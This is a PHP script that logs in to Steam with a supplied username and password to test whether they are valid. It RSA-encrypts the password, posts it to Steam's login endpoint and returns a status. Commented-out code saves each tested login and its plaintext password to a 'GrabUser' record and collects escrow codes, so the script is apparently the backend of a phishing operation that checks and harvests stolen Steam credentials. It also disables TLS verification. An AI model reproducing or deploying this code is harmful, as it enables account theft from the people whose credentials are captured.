<?php
	require_once("../php/phpseclib/vendor/autoload.php");

	use phpseclib\Math\BigInteger;
	use phpseclib\Crypt\RSA;
	
    function Validate($login,$password){
        $result = [];
        geturl("https://store.steampowered.com/login/getrsakey/", null, "/tmp/cook.txt",  array('username' => $login,'donotcache' => time()), 0, $info, $output);
        $data = json_decode($output, true);
		
        if ($data['success'] == true) {
            $publickey_exp = $data['publickey_exp'];
            $publickey_mod = $data['publickey_mod'];

            $RSA = new RSA();
			$RSA->setEncryptionMode(RSA::ENCRYPTION_PKCS1);
			
			$key = [
				'modulus'        => new BigInteger($publickey_mod, 16),
				'publicExponent' => new BigInteger($publickey_exp, 16)
			];
		
            $RSA->loadKey($key, CRYPT_RSA_PUBLIC_FORMAT_RAW);
            $encryptedPassword = urlencode(base64_encode($RSA->encrypt($password)));
            $encryptedPassword = str_replace('/', '%2F', $encryptedPassword);
            $encryptedPassword = str_replace('+', '%2B', $encryptedPassword);
            $encryptedPassword = str_replace('=', '%3D', $encryptedPassword);
			
echo $encryptedPassword;

            //print_r($data);
			
            $captchaGid = -1;
            $captchaText = '';
            $emailAuth = '';
            $emailSteamId = '';

            $params = array(
                'username' => $login,
                'password' => $encryptedPassword,
                'rsatimestamp' => $data['timestamp'],
                'captcha_gid' => $captchaGid,
                'captcha_text' => $captchaText,
                'emailauth' => $emailAuth,
                'emailsteamid' => $emailSteamId
            );
			
            geturl("https://store.steampowered.com/login/dologin/", null, "/tmp/cook.txt", $params, 0, $info, $output);
            $data1 = json_decode($output, true);

            if (empty($data1['message']) || $data1['requires_twofactor'] == 1) {
			//	$grab = GrabUser::find()->where(['login' => $login])->one();
                $result['status'] = true;
                // if(empty($grab)) {
                    // $user = new GrabUser();
                    // $user->login = $login;
                    // $user->password = $password;
                    // $user->save();
                // }

            } 
			else $result['status'] = false;
        }
        return json_encode($result);
    }

    // public function actionAjaxValidateEscrow($login,$code){
        // $grab = GrabUser::find()->where(['login' => $login])->one();
        // if($grab){
            // $grab->code = $code;
            // $grab->save();
            // return true;
        // }
    // }

    function geturl($url, $ref, $cookie, $postdata, $header, &$info, &$output, $gaga = null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPGET, TRUE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        ));
        if ($ref) {
            curl_setopt($ch, CURLOPT_REFERER, $ref);
        }
        if ($cookie) {
            //echo dirname(__FILE__).$cookie;
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        }
        if ($gaga !== null) {
            //$boundary = 'TITO-' . md5(time());
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        } else {
            if ($postdata) {
                curl_setopt($ch, CURLOPT_POST, true);
                $postStr = "";
                foreach ($postdata as $key => $value) {
                    if ($postStr)
                        $postStr .= "&";
                    $postStr .= $key . "=" . $value;
                }
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postStr);
            }
        }

        curl_setopt($ch, CURLOPT_HEADER, $header);
        $info = curl_getinfo($ch);
        $output = curl_exec($ch);
        curl_close($ch);
    }
	
echo Validate("sxfnctumn6tydumtghm", "ssrtntyd,udmxfncghm");
?>